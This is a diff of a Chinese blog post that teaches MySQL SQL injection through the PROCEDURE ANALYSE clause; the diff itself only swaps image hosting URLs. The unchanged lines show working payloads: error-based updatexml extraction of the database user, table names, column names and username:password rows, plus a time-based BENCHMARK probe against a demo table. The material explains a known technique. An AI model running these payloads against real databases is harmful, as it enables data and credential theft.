@@ -43,7 +43,7 @@ Mysql5的`SELETCT`语法:
 
 >一个测试表:
 
-<img src="http://pfr2vvlbk.bkt.clouddn.com/34324b9a.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/34324b9a.png">
 
 **ANALYSE函数是可以查看表的优化建议**
 
@@ -70,31 +70,31 @@ ANALYSE函数后面可以有两个参数:
 
 	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,user()),0),1);
 	
-<img src="http://pfr2vvlbk.bkt.clouddn.com/213h8sad.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/213h8sad.png">
 
 **爆表:**
 
 	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat(table_name) from information_schema.tables where table_schema=database() limit 0,1)),0),1);
 
-<img src="http://pfr2vvlbk.bkt.clouddn.com/XA78as89.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/XA78as89.png">
 
 **爆字段:**
 
 	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat(column_name) from information_schema.columns where table_name='injection' limit 0,1)),0),1);
 	
-<img src="http://pfr2vvlbk.bkt.clouddn.com/32BSF8.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/32BSF8.png">
 
 **爆数据:**
 
 	select * from injection where id>0 order by id limit 0,1 procedure analyse(updatexml(0,concat(0x7e,(select concat_ws(':',id,username,password) from injection limit 0,1)),0),1);
 
-<img src="http://pfr2vvlbk.bkt.clouddn.com/sad782eq.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/sad782eq.png">
 
 **如果不支持报错注入的话,还可以基于时间注入:**
 
 	SELECT * FROM injection WHERE id > 0 ORDER BY id LIMIT 1,1 PROCEDURE analyse((select extractvalue(rand(),concat(0x3a,(IF(MID(version(),1,1) LIKE 5, BENCHMARK(5000000,SHA1(1)),1))))),1);
 
-<img src="http://pfr2vvlbk.bkt.clouddn.com/3ewg87sdfb.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/3ewg87sdfb.png">
 
 >一个Demo:
 
@@ -121,10 +121,10 @@ ANALYSE函数后面可以有两个参数:
 	
 	mysql_close($obj);
 
-<img src="http://pfr2vvlbk.bkt.clouddn.com/3neiuwyfd.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/3neiuwyfd.png">
 
 >执行的语句:
 
-<img src="http://pfr2vvlbk.bkt.clouddn.com/2nuefdys8.png">
+<img src="http://tr3jer-1252048719.cos.ap-hongkong.myqcloud.com/2nuefdys8.png">
 
 >Mysql内建的特性有很多,不过能够利用的缺陷还有待挖掘:)
